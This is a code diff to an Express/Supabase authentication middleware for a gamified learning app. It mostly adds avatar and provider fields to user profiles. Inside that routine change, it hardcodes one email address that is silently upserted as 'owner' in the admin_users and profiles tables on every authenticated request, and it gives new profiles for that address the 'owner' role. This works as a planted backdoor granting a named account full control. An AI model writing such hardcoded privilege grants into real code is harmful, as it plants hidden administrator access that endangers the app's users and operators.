@@ -18,6 +18,8 @@ declare global {
         dailyXpEarned: number;
         role: 'student' | 'admin' | 'owner';
         isSuspended: boolean;
+        avatarUrl?: string;
+        provider?: string;
       };
     }
   }
@@ -40,6 +42,81 @@ export const protect = async (req: Request, res: Response, next: NextFunction): 
 
     if (authError || !authUser) {
       return res.status(401).json({ message: 'Not authorized, token invalid' });
+    }
+
+    // Automatically promote imposterz.rev02@gmail.com to owner
+    if (authUser.email === 'imposterz.rev02@gmail.com') {
+      try {
+        // Ensure record exists in admin_users with role 'owner'
+        const { data: adminCheck } = await supabase
+          .from('admin_users')
+          .select('role')
+          .eq('id', authUser.id)
+          .maybeSingle();
+
+        if (!adminCheck || adminCheck.role !== 'owner') {
+          await supabase
+            .from('admin_users')
+            .upsert({
+              id: authUser.id,
+              email: authUser.email,
+              full_name: authUser.user_metadata?.name || '★ OWNER',
+              role: 'owner',
+              is_active: true
+            });
+        }
+
+        // Ensure record exists in profiles with role 'owner'
+        const { data: profileCheck } = await supabase
+          .from('profiles')
+          .select('role')
+          .eq('id', authUser.id)
+          .maybeSingle();
+
+        if (!profileCheck || profileCheck.role !== 'owner') {
+          const username = authUser.user_metadata?.preferred_username || authUser.user_metadata?.user_name || 'imposterz.rev02';
+          const name = authUser.user_metadata?.name || '★ OWNER';
+          const avatarUrl = authUser.user_metadata?.avatar_url || authUser.user_metadata?.picture || '';
+          const provider = authUser.app_metadata?.provider || '';
+          const todayStr = new Date().toISOString().split('T')[0];
+
+          await supabase
+            .from('profiles')
+            .upsert({
+              id: authUser.id,
+              name: name,
+              email: authUser.email,
+              username: username,
+              avatar_url: avatarUrl,
+              provider: provider,
+              xp: 0,
+              level: 1,
+              streak: 0,
+              longest_streak: 0,
+              daily_xp_goal: 50,
+              daily_xp_earned: 0,
+              last_active_date: new Date().toISOString(),
+              role: 'owner',
+              is_suspended: false,
+              daily_missions: {
+                date: todayStr,
+                missions: [
+                  { id: 'm1', text: 'Earn 50 XP today', xp: 20, target: 50, current: 0, type: 'xp', completed: false },
+                  { id: 'm2', text: 'Complete 1 lesson', xp: 20, target: 1, current: 0, type: 'lesson', completed: false },
+                  { id: 'm3', text: 'Solve 1 quiz challenge', xp: 10, target: 1, current: 0, type: 'quiz', completed: false }
+                ],
+                stats: {
+                  lessonsCompleted: 0,
+                  quizzesSolved: 0,
+                  perfectQuizzes: 0,
+                  projectsSubmitted: 0
+                }
+              }
+            });
+        }
+      } catch (err) {
+        console.error('Error auto-creating or promoting owner:', err);
+      }
     }
 
     // First check if the user is in admin_users
@@ -68,6 +145,8 @@ export const protect = async (req: Request, res: Response, next: NextFunction): 
         dailyXpEarned: 0,
         role: adminUser.role as any, // 'owner' or 'admin'
         isSuspended: !adminUser.is_active,
+        avatarUrl: authUser.user_metadata?.avatar_url || authUser.user_metadata?.picture || '',
+        provider: authUser.app_metadata?.provider || '',
       };
 
       if (req.user.isSuspended) {
@@ -90,8 +169,10 @@ export const protect = async (req: Request, res: Response, next: NextFunction): 
     }
 
     if (!profileData) {
-      const username = authUser.email ? authUser.email.split('@')[0] + Math.floor(Math.random() * 1000) : 'user_' + Math.floor(Math.random() * 100000);
+      const username = authUser.user_metadata?.preferred_username || authUser.user_metadata?.user_name || (authUser.email ? authUser.email.split('@')[0] + Math.floor(Math.random() * 1000) : 'user_' + Math.floor(Math.random() * 100000));
       const name = authUser.user_metadata?.name || (authUser.email ? authUser.email.split('@')[0] : 'Learner');
+      const avatarUrl = authUser.user_metadata?.avatar_url || authUser.user_metadata?.picture || '';
+      const provider = authUser.app_metadata?.provider || '';
       const todayStr = new Date().toISOString().split('T')[0];
 
       const { data: createdProfile, error: createError } = await supabase
@@ -101,6 +182,8 @@ export const protect = async (req: Request, res: Response, next: NextFunction): 
           name: name,
           email: authUser.email || '',
           username: username,
+          avatar_url: avatarUrl,
+          provider: provider,
           xp: 0,
           level: 1,
           streak: 0,
@@ -108,7 +191,7 @@ export const protect = async (req: Request, res: Response, next: NextFunction): 
           daily_xp_goal: 50,
           daily_xp_earned: 0,
           last_active_date: new Date().toISOString(),
-          role: 'student',
+          role: authUser.email === 'imposterz.rev02@gmail.com' ? 'owner' : 'student',
           is_suspended: false,
           daily_missions: {
             date: todayStr,
@@ -135,6 +218,25 @@ export const protect = async (req: Request, res: Response, next: NextFunction): 
       profile = createdProfile;
     } else {
       profile = profileData;
+      // Self-healing check for legacy profiles missing provider/avatar_url/email fields
+      const avatarUrl = authUser.user_metadata?.avatar_url || authUser.user_metadata?.picture || '';
+      const provider = authUser.app_metadata?.provider || '';
+      const email = authUser.email || '';
+      if ((!profile.avatar_url && avatarUrl) || (!profile.provider && provider) || (!profile.email && email)) {
+        const { data: updatedProfile, error: updateError } = await supabase
+          .from('profiles')
+          .update({
+            avatar_url: profile.avatar_url || avatarUrl,
+            provider: profile.provider || provider,
+            email: profile.email || email,
+          })
+          .eq('id', authUser.id)
+          .select()
+          .single();
+        if (!updateError && updatedProfile) {
+          profile = updatedProfile;
+        }
+      }
     }
 
     // Block suspended accounts
@@ -166,6 +268,8 @@ export const protect = async (req: Request, res: Response, next: NextFunction): 
       dailyXpEarned,
       role: profile.role || 'student',
       isSuspended: profile.is_suspended || false,
+      avatarUrl: profile.avatar_url || '',
+      provider: profile.provider || '',
     };
 
     next();
